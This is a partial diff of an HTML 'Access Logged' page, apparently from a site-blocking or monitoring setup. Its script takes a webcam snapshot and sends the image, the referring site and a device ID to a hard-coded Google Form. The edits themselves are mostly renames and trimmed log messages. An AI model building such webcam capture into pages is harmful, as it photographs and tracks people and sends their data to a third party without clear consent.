@@ -3,23 +3,26 @@
 <head>
   <title>Access Logged</title>
   <script>
-    const scriptURL = "https://docs.google.com/forms/d/e/1FAIpQLSf1C_6KKbmpRTcSuAehZV_0hbtMyouGylAwvL1liIi3M4v6hQ/formResponse";
+    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSf1C_6KKbmpRTcSuAehZV_0hbtMyouGylAwvL1liIi3M4v6hQ/formResponse";
+
     const deviceID = new URLSearchParams(window.location.search).get('device') || 'UNKNOWN';
     const referrer = document.referrer || 'Unknown Site';
 
     function sendSnapshot(imgData) {
       const formData = new FormData();
-      formData.append('entry.2012483072', imgData);        // Snapshot
-      formData.append('entry.500527079', referrer);        // Visited Site
-      formData.append('entry.1027569634', deviceID);       // Device ID
+      formData.append("entry.2012483072", imgData);
+      formData.append("entry.500527079", referrer);
+      formData.append("entry.1027569634", deviceID);
 
-      fetch(scriptURL, {
+      fetch(formURL, {
         method: 'POST',
         mode: 'no-cors',
         body: formData
       }).then(() => {
-        console.log("Violation logged via Google Form");
-      }).catch(err => console.error("Log failed", err));
+        console.log("Logged");
+      }).catch((err) => {
+        console.error("Error:", err);
+      });
     }
 
     function snap() {
@@ -40,7 +43,7 @@
           }, 1500);
         })
         .catch(err => {
-          console.error("Camera access failed", err);
+          console.error("Camera access failed");
         });
     }
 
